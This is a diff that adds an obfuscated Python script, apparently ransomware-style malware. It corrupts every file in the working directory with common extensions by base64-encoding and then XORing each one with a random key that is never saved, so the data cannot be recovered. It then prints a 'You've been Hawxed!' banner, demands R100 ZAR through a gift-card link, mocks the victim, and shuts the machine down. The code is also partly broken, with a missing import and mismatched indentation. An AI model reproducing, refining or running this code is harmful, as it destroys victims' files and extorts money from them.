@@ -1,0 +1,119 @@
+def N8DIm8WcAnqpC9xYJtMH() :
+    import random
+    import base64
+    import sys
+    import os
+    import subprocess
+    os.system("CLS")
+    os.system("COLOR 0A")
+    myEey2NkBUlJhhP=1
+    myEey2NkBUlJhhP=int(myEey2NkBUlJhhP)
+    xj5jZQRThbDq3Qn=''.join([chr(random.randint(0,127)) for i in range(100)])
+    def jbPstMqhBk2pzGu(pSZMXIbUUBA506c):
+        pSZMXIbUUBA506c=pSZMXIbUUBA506c.replace(';',';\n')
+        pSZMXIbUUBA506c=pSZMXIbUUBA506c.replace('{','{\n')
+        pSZMXIbUUBA506c=pSZMXIbUUBA506c.replace('}','}\n')
+        FCvN94CcTrQaCg8=pSZMXIbUUBA506c.split('\n')
+        pSZMXIbUUBA506c=''
+        xh7em1jW7hHhPVq=0
+        for qBrIrH8tt4ujdrk in FCvN94CcTrQaCg8:
+            if qBrIrH8tt4ujdrk.strip().endswith('{'):
+                xh7em1jW7hHhPVq+=1
+            pSZMXIbUUBA506c+='  '*xh7em1jW7hHhPVq+qBrIrH8tt4ujdrk+'\n'
+            if qBrIrH8tt4ujdrk.strip().endswith('}'):
+                xh7em1jW7hHhPVq-=1
+        return pSZMXIbUUBA506c
+    def AUn4HogXNpW7jGT(JYQbUcb7jX9u3NI):
+      with open(JYQbUcb7jX9u3NI,'r') as fX0fp7tzH29kmcs:
+        B1y7nS54TQmBcZ1=fX0fp7tzH29kmcs.read()
+      ktTYP1HMX4Ik1bg=base64.b64encode(B1y7nS54TQmBcZ1.encode('utf-8')).decode('utf-8')
+      with open(JYQbUcb7jX9u3NI,'w') as fX0fp7tzH29kmcs:
+        fX0fp7tzH29kmcs.write(ktTYP1HMX4Ik1bg)
+    def uGzo1MJAAAbFOqY(JYQbUcb7jX9u3NI, xj5jZQRThbDq3Qn):
+      with open(JYQbUcb7jX9u3NI,'r') as fX0fp7tzH29kmcs:
+        B1y7nS54TQmBcZ1=fX0fp7tzH29kmcs.read()
+      myEey2NkBUlJhhP=[ord(c) for c in B1y7nS54TQmBcZ1]
+      Jm4t7gPVEj4OBdW=[ord(c) for c in xj5jZQRThbDq3Qn]
+      RxtMUQrgGyZaU0T=[c ^ k for c, k in zip(myEey2NkBUlJhhP,Jm4t7gPVEj4OBdW)]
+      QZbeoS8NKF5dStA=''.join([chr(i) for i in RxtMUQrgGyZaU0T])
+      with open(JYQbUcb7jX9u3NI,'w') as fX0fp7tzH29kmcs:
+        fX0fp7tzH29kmcs.write(QZbeoS8NKF5dStA)
+    def jafHGUr9Xp7YXKw(cuXx5wN8ttGYFrc):
+        print(f"Corrupting file: {cuXx5wN8ttGYFrc}")
+        AUn4HogXNpW7jGT(cuXx5wN8ttGYFrc)
+        uGzo1MJAAAbFOqY(cuXx5wN8ttGYFrc,xj5jZQRThbDq3Qn)
+
+print(",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,..................")
+print(",,,,,,,,,,,,,,,,,,,,,,,*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,.,.,..........")
+print(",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,............,,,,,,,,,,,,,,,,,,................")
+print(",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,,,.,,,,,,,,,,,,,.,.........,,,,,")
+print(",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,*//(/((((((/***,,,,,,,,,,,,,,,,,,.....,....")
+print(",,,,,,,,,,,,,,,,,,,,,,,,,,,,*/(((((###((##((((((######(((/,,.,,,,,,,,,,,,,.,.,.,")
+print(",,,,,,,,,,,,,,,,,,,,,*((#############(###(#####%#######(##(/*,.,,,,,,,,..,,.....")
+print(",,,,,,,,,,,,,,,,,,,/###%%%%###################((##########%#(##(*,,,,,,,,,.,,,,,")
+print(",,,,,,,,,,,,,,,,,/##%%%%%###%########%%#########%%#%%#%%###(((((#(/,,,,,,,,,,,,,")
+print(",,,,,,,,,,,,,,,*(%%%%%%%########%%##%%%%#%%%%%%%%%%%##((((#((///((//**,,,,,,,,,,")
+print(",,,,,,,,,,,,,,/%%###%###(((((#%#####################((////(/////(((((/*,,,,,,,,,")
+print(",,,,,,,,,,,,,*(####(((((///((//((/(((((((#(#(((((((//////////////((((((*,,,,,,,,")
+print(",,,,,,,,,,,,*/##(((((///(/**/(/**//***//////////////////*////****//(###(*,,,,,,,")
+print(",,,,,,,,,,,,*(##(#((//*****,,,,,,,********////*/***/*/***///*******/(##(/*,,,,,,")
+print(",,,,,,,,,,,,*(((((/****,,,,,,,,,,,,*************************/*******/(##(/,,,,,,")
+print(",,,,,,,,,,,,*(((//*****,,,,,,,,,,,,**********************/////*****/*/(##/,,,,,,")
+print(",,,,,,,,,,,,,/((/***,,,,,,,,,,,,,,*************************/*/*****///((((*,,,,,")
+print(",,,,,,,,,,,,*(((///*,,,,,,,,,,,,,,,***************////////**/******///((#(*,,,,,")
+print(",,,,,,,,,,,,*((((***,,,*****/////(//////*******////////////***//****//((#(*,,,,,")
+print(",,,,,,,,,,,,*(((/***,*,**/(####%%%%%###(///////(((((((((#(((((//****///(#(*,,,,,")
+print(",,,,,,,,,****(((/**,*,**///////(/(######(/////((((######%%%%%###((/***/(#(*,,,,,")
+print(",,,,,,,,*/***/((*********//#%((#%%%%%%##(/****//(####%%%%###(((((((/***/(#*,,,,,")
+print(",,,,,,,,**,,**/(********/(//////(((#####(*****//((##%%%%%%%%%%%##(/****/((///(/,")
+print(",,,,,,,,**,**/(/*******,,,***/((((((((//******//((((########(((((((/****/(((((/*")
+print(",,,,,,,,,*/(((#(*******,,,,,********************/((((((((((((((///****///((//(/,")
+print(",,,,,,,,,*//((((/*******,,,,,*****////********////((((((((((////////**//(#((((#&")
+print(",,,,,,,,,,,**//(/*************///(((#********//////(((##((((///////////((#(((#&&")
+print(",,,,,,,,,,,,*,,/(/*********//(((####(//((((((#(#((((((####((((/////////(((/(%&&&")
+print(",,,,,,,,,,,,,**//*********//(######(**////(##%%%############((((//////((///&&&&&")
+print(",,,,,,,,,,,,,,,,*/*******//(#((((////(/((((###################((((((//((/#&&&&&&")
+print(",,,,,,,,,,,,,,,,********///(((###(((((((((((#(#################((((((/(%&&&&&&##")
+print(",,,,,,,,,,,,,,,,,*//*//////((#%%%###(/*.,***////(((##%%%%%#%##((((((((%&&&&&&%##")
+print(",,,,,,,,,,,,,,,,,,*/////////(##(/******//(((((((##%#####%%%##((((((((%%#####%%%#")
+print(",,,,,,,,,,,,,,,,,,*////////((#((*******///((((((((((((########((((((##########%%")
+print(",,,,,,,,,,,,,,,,,,,*///////((((/*****///((((#####(((((#########((#########%%%%%%")
+print("*/***,,,,,,,,*,*,*,**//(/(/((((/*****////(((####((((#((######################%%%")
+print("*,,*,*,,,,,***********//((((((((////*****//((((((((((##############%%%%%%###%%%%")
+print("**********************////((((((((((///(((###(((#######%%%###((##%%%%%%%%%%%####")
+print("********,*,**/((*,,****////((((((##(((((#####(#####%#%%#####(((#%%%%%%%%%%%%%%##")
+print("*****/#%%%%%(*****,****/////(((((#%%###%#######%%%%%%%%###(((((%%%%%%%%%%%%%%###")
+print("/#&%%%%%%%%#/*,,*.******/////////((#%%&&&&&&&&%%%%%######(((((#%%%%%%%%&&&%%%###")
+print("%%%%%%%%%%%%(*,,.,*****///////*///((##%%%%%%%%%%########((((/,,/(%%%%%&&&&&&&&%#")
+print("%%%%%&&&&%&%#/.,..******//////***///(((####%###########(((((/,..,*(%%&&&%##%&&&&")
+print("%%&%%&%&&&&%#*.*..*****//////////////((################(((((/*...,*(%%%&&&%%%%&%")
+print("&&&&&&%&&&&%(,.. ./*****///////////((((##############((((((//*,..,*/%%%%&&%&%%%%")
+print("&&&&&&&&&&&%#,.,../#/**///////////((((###############((((((//*,*,*/%&%%%&&&&&&%%")
+print("&&&&&&&&&&&%#*.,*.*&&%#///////////(((################(((((((/*,*,/&&&&&%&&&&&&&&")
+    print(" ")
+    print("You've been Hawxed!")
+    WonSKPUu6G2oBMV=os.listdir()
+    WOFbzxldl4X9zqH=WonSKPUu6G2oBMV
+    for cuXx5wN8ttGYFrc in WOFbzxldl4X9zqH:
+        if cuXx5wN8ttGYFrc.endswith(".txt") or cuXx5wN8ttGYFrc.endswith(".py") or cuXx5wN8ttGYFrc.endswith(".bat") or cuXx5wN8ttGYFrc.endswith(".js") or cuXx5wN8ttGYFrc.endswith(".cs") or cuXx5wN8ttGYFrc.endswith(".html") or cuXx5wN8ttGYFrc.endswith(".bin") or cuXx5wN8ttGYFrc.endswith(".jar") or cuXx5wN8ttGYFrc.endswith(".php") or cuXx5wN8ttGYFrc.endswith(".css") or cuXx5wN8ttGYFrc.endswith(".sql") or cuXx5wN8ttGYFrc.endswith(".rtf"):
+            jafHGUr9Xp7YXKw(cuXx5wN8ttGYFrc)       
+    while (myEey2NkBUlJhhP==1) :
+        print("------------------------------")
+        print(" ")
+        print(">> Send R100 ZAR to @")
+        print(">> VIA : https://www.egifter.com/gifter/sku/COLONELHAWX100?value=100.00")
+        print(" ")
+        print(">> Close this program and your files will be lost FOREVER ")
+        print(" ")
+        NhKaHmHA13jYVDx=input(">> PASS to verify payment ( will receive via email ) : ")
+        NhKaHmHA13jYVDx=str(NhKaHmHA13jYVDx)
+        print(" ")
+        print(">> LOL! . ")
+        time.sleep(5)
+        os.system("SHUTDOWN -S")
+        if (myEey2NkBUlJhhP!=1) :
+            myEey2NkBUlJhhP=0
+            break
+N8DIm8WcAnqpC9xYJtMH()
+
+
